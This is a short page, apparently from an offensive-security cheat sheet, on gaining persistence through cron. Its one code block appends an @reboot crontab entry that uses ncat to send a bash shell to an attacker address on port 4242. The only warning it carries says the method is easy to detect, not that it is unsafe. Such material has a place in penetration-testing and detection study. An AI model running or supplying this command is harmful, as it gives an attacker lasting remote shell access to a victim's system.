# ⚠ Crontab Reverse Shell (Not OPSEC)

{% hint style="danger" %}
cron jobs are obviously visible in crontab, so this method is not recommended.
{% endhint %}

```
(crontab -l ; echo "@reboot sleep 200 && ncat 192.168.1.2 4242 -e /bin/bash")|crontab 2> /dev/null
```

###

\
